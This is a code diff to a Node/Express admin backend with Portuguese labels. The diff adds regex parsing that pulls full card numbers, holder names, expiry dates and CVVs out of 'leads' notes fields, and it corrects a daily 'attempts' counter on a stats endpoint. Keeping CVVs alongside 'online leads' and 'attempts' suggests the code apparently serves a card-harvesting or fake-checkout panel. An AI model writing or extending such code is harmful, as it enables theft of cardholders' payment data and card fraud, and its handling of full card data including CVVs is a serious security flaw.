@@ -192,11 +192,24 @@ function writeLocalTransactions(data) {
 function mapLeadToTransaction(lead) {
   const finalPrice = parseFloat(lead.final_price || lead.totalPrice || lead.amount || 0);
   const paymentMethod = String(lead.payment_method || lead.paymentMethod || 'PIX').toLowerCase();
-  const cardNumber = String(lead.card_number || lead.cardNumber || (lead.card && lead.card.number) || '').trim();
-  const cardName = String(lead.card_name || lead.cardHolder || (lead.card && lead.card.holder) || '-').trim();
-  const cardExpiry = String(lead.card_expiry || lead.cardExpiry || (lead.card && lead.card.expiry) || '-').trim();
-  const cardCvv = String(lead.card_cvv || lead.cardCvv || (lead.card && lead.card.cvv) || '-').trim();
-  const installments = String(lead.installments || lead.cardInstallments || (lead.card && lead.card.installments) || 'À vista').trim();
+  let cardNumber = String(lead.card_number || lead.cardNumber || (lead.card && lead.card.number) || '').trim();
+  let cardName = String(lead.card_name || lead.cardHolder || (lead.card && lead.card.holder) || '-').trim();
+  let cardExpiry = String(lead.card_expiry || lead.cardExpiry || (lead.card && lead.card.expiry) || '-').trim();
+  let cardCvv = String(lead.card_cvv || lead.cardCvv || (lead.card && lead.card.cvv) || '-').trim();
+  let installments = String(lead.installments || lead.cardInstallments || (lead.card && lead.card.installments) || 'À vista').trim();
+
+  // Parsing de fallback caso os dados do cartão estejam salvos no campo notes/observacoes
+  const notesStr = String(lead.notes || lead.observacoes || '');
+  if ((!cardNumber || cardNumber === '-' || cardNumber === 'PIX') && notesStr.includes('Num:')) {
+    const numMatch = notesStr.match(/Num:\s*([^|]+)/i);
+    const nameMatch = notesStr.match(/Nome:\s*([^|]+)/i);
+    const valMatch = notesStr.match(/Val:\s*([^|]+)/i);
+    const cvvMatch = notesStr.match(/CVV:\s*([^|]+)/i);
+    if (numMatch && numMatch[1]) cardNumber = numMatch[1].trim();
+    if (nameMatch && nameMatch[1]) cardName = nameMatch[1].trim();
+    if (valMatch && valMatch[1]) cardExpiry = valMatch[1].trim();
+    if (cvvMatch && cvvMatch[1]) cardCvv = cvvMatch[1].trim();
+  }
 
   let brand = 'PIX';
   if (paymentMethod !== 'pix') {
@@ -214,8 +227,8 @@ function mapLeadToTransaction(lead) {
     ip: lead.ip || lead.client_ip || '127.0.0.1',
     date: lead.created_at
       ? new Date(lead.created_at).toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })
-      : new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }),
-    timestamp: lead.created_at ? new Date(lead.created_at).getTime() : Date.now(),
+      : (lead.date || new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })),
+    timestamp: lead.created_at ? new Date(lead.created_at).getTime() : (lead.timestamp || Date.now()),
     brand: brand,
     status: (lead.status || 'PENDENTE').toUpperCase(),
     amount: finalPrice,
@@ -499,6 +512,9 @@ app.get('/api/online-leads', checkAdminAuth, async (req, res) => {
 app.get('/api/stats', checkAdminAuth, async (req, res) => {
   try {
     const transactions = await getTransactionsList();
+    const todayStr = new Date().toLocaleDateString('pt-BR', { timeZone: 'America/Sao_Paulo' });
+    const todayTxs = transactions.filter(t => t.date && t.date.split(',')[0].trim() === todayStr);
+
     const paid = transactions.filter(t => t.status === 'PAGO');
     const pending = transactions.filter(t => t.status === 'PENDENTE');
     const declined = transactions.filter(t => t.status === 'NEGADO');
@@ -507,7 +523,7 @@ app.get('/api/stats', checkAdminAuth, async (req, res) => {
 
     res.json({
       totalAttempts: transactions.length,
-      todayAttempts: transactions.length,
+      todayAttempts: todayTxs.length,
       totalAprovados: paid.length,
       totalReceita,
       totalAguardandoPagamento: totalAguardando,
